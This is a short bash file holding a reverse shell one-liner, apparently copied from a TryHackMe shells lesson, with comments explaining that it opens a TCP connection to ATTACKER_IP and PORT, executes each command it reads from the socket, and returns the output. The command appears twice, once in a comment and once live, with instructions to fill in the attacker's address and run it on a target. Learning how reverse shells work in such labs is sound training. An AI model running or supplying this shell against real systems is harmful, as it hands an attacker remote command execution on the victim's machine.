# Bash Read Line Reverse Shell
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run on target
#
#   exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
#
# Creates file descriptor 5, connects to TCP socket.
# Reads and executes commands from socket, sends output back.

exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
